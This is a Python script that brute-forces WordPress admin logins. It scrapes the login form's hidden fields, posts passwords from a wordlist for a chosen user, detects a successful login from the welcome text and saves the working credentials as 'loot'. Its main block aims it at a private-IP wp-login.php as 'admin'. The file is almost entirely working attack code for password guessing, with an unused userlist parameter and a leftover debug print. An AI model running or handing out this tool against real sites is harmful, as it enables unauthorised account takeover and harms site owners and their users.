from bs4 import BeautifulSoup
import requests
import time

from filehandler import read_list


class WordpressLogin:
    def __init__(self, target: str):
        self.target: str = target
        self.user = None
        self.password = None
        self.loot: dict = {}

    def _get_params(self, content: bytes) -> dict:
        """An internal function to fetch parameters

        This is an internal function which fetches both hidden av visible
        input fields from a given html text.

        args:
            content (bytes): web content from beautifulsoup in bytes

        returns:
            params (dict): A dict with input fields"""
        params = {}
        print(type(content))
        soup = BeautifulSoup(content, "html.parser")
        for param in soup.find_all("input"):
            name = param.get("name")
            if name is not None:
                params[name] = param.get("value", None)
        return params

    def login_brute(
        self,
        user: str | None = None,
        password: str | None = None,
        passlist: str | None = None,
        userlist: str | None = None,
    ):
        loot = {}
        # create a list of given passwords + wordlist passwords
        passwords = []
        if password is not None:
            passwords.append(password)
        elif passlist is not None:
            try:
                pwd = read_list(passlist)
                passwords.extend(pwd)
            except TypeError as e:
                print(f"could not add passlist: {e}")

        s = requests.Session()
        try:
            login_page = s.get(self.target)
            login_page.raise_for_status()
        except requests.exceptions.HTTPError as e:
            print(f"Could not retrieve login site: {e}")
            return
        params = self._get_params(login_page.content)
        params["log"] = user
        for p in passwords:
            params["pwd"] = p
            t = s.post(self.target, data=params)
            if "Welcome to WordPress!" in t.text:
                self.loot[user] = p
                loot[user] = p
                break
        return loot


if __name__ == "__main__":
    test = WordpressLogin(target="http://10.1.1.39:8080/wp-login.php")
    test.login_brute(user="admin", passlist="wordlist/test.txt")
